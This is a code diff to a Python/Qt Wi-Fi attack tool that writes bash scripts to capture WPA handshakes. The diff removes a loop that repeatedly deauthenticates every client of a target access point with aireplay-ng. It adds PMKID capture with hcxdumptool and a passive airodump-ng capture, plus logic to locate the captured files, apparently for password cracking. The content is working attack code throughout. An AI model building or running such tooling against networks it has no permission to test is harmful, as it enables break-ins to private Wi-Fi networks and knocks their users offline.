@@ -1151,34 +1151,24 @@ class MaximWindow(QMainWindow):
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n\n")
 
-        # Get wlan0 MAC to exclude from deauth
-        script.write("MY_MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null | tr '[:upper:]' '[:lower:]')\n")
-        script.write("echo \"  Your wlan0 MAC: $MY_MAC (protected)\"\necho\n\n")
+        # PMKID capture first (no deauth needed), then passive handshake capture as fallback
+        # hcxdumptool grabs PMKID directly from the AP — zero disruption
+        script.write("echo '  [*] Trying PMKID capture (no deauth)...'\n")
+        script.write(f"echo '$BSSID' | tr -d ':' > /tmp/maxim_filter.txt\n")
+        pmkid_file = f"{essid_dir}/pmkid.pcapng"
+        script.write(f"sudo timeout 30 hcxdumptool -i {iface} --filterlist_ap=/tmp/maxim_filter.txt --filtermode=2 -o '{pmkid_file}' 2>&1\n")
+        script.write(f"rm -f /tmp/maxim_filter.txt\n\n")
 
-        # Background: find clients on target AP, deauth only those != wlan0 MAC
-        # Uses targeted -c CLIENT deauth, never broadcast
-        script.write("(\n")
-        script.write("  sleep 8\n")  # let airodump collect some stations first
-        script.write("  while true; do\n")
-        # Read stations from the airodump CSV that's being written by the foreground process
-        script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
-        script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
-        script.write("      grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"$BSSID\" | while IFS=, read -r STA REST; do\n")
-        script.write("        STA=$(echo \"$STA\" | tr -d ' ' | tr '[:upper:]' '[:lower:]')\n")
-        script.write("        if [ -n \"$MY_MAC\" ] && [ \"$STA\" = \"$MY_MAC\" ]; then continue; fi\n")
-        script.write("        if [ -n \"$STA\" ]; then\n")
-        script.write(f"          sudo aireplay-ng --deauth 3 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
-        script.write("        fi\n")
-        script.write("      done\n")
-        script.write("    fi\n")
-        script.write("    sleep 10\n")
-        script.write("  done\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID=$!\n\n")
-
-        # Foreground: capture on the target channel+BSSID (also writes CSV with stations)
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
-        script.write("kill $DEAUTH_PID 2>/dev/null\n")
+        # Check if we got a PMKID
+        script.write(f"if [ -f '{pmkid_file}' ] && [ -s '{pmkid_file}' ]; then\n")
+        script.write("  echo '  [+] PMKID captured!'\n")
+        script.write("else\n")
+        script.write("  echo '  [-] No PMKID, switching to passive handshake capture...'\n")
+        script.write("  echo '  Waiting for a client to connect/reconnect naturally.'\n")
+        script.write("  echo '  (Tip: toggle WiFi on a phone connected to this network)'\n")
+        script.write("  echo\n")
+        script.write(f"  sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n")
+        script.write("fi\n\n")
 
         # If user closes terminal manually
         script.write(f"echo 'DONE' > '{signal_file}'\n")
@@ -1246,33 +1236,44 @@ class MaximWindow(QMainWindow):
                 # wifite finished — do one final check for .cap files before giving up
                 pass  # fall through to .cap check below
 
-        # Check .cap files for valid handshake — search wifite dirs for NEW files only
-        # (only files created AFTER capture started)
+        # Check for PMKID pcapng first, then .cap files
         capture_start = getattr(self, '_hs_capture_start', 0)
-        all_caps = []
-        for search_dir in getattr(self, '_hs_wifite_dirs', [essid_dir]):
-            all_caps.extend(glob.glob(f"{search_dir}/*.cap"))
-            all_caps.extend(glob.glob(f"{search_dir}/**/*.cap", recursive=True))
-        # Only consider files created/modified AFTER we started the capture
-        fresh_caps = []
-        seen = set()
-        for cf in all_caps:
-            real = os.path.realpath(cf)
-            if real in seen:
-                continue
-            seen.add(real)
-            try:
-                if os.path.getmtime(cf) >= capture_start:
-                    fresh_caps.append(cf)
-            except Exception:
-                pass
-        fresh_caps.sort(key=lambda f: os.path.getmtime(f), reverse=True)
-
         cap_file = None
-        for cf in fresh_caps:
-            if self._cap_has_handshake(cf):
-                cap_file = cf
-                break
+
+        # 1. Check for PMKID pcapng file
+        essid_dir = getattr(self, '_hs_essid_dir_path', '')
+        if essid_dir:
+            pmkid_file = os.path.join(essid_dir, 'pmkid.pcapng')
+            if os.path.exists(pmkid_file) and os.path.getsize(pmkid_file) > 0:
+                try:
+                    if os.path.getmtime(pmkid_file) >= capture_start:
+                        cap_file = pmkid_file
+                except Exception:
+                    pass
+
+        # 2. Check .cap files for valid handshake
+        if not cap_file:
+            all_caps = []
+            for search_dir in getattr(self, '_hs_wifite_dirs', [essid_dir] if essid_dir else []):
+                all_caps.extend(glob.glob(f"{search_dir}/*.cap"))
+                all_caps.extend(glob.glob(f"{search_dir}/**/*.cap", recursive=True))
+            fresh_caps = []
+            seen = set()
+            for cf in all_caps:
+                real = os.path.realpath(cf)
+                if real in seen:
+                    continue
+                seen.add(real)
+                try:
+                    if os.path.getmtime(cf) >= capture_start:
+                        fresh_caps.append(cf)
+                except Exception:
+                    pass
+            fresh_caps.sort(key=lambda f: os.path.getmtime(f), reverse=True)
+            for cf in fresh_caps:
+                if self._cap_has_handshake(cf):
+                    cap_file = cf
+                    break
 
         if not cap_file:
             # If wifite already finished (DONE signal) and still no handshake, stop
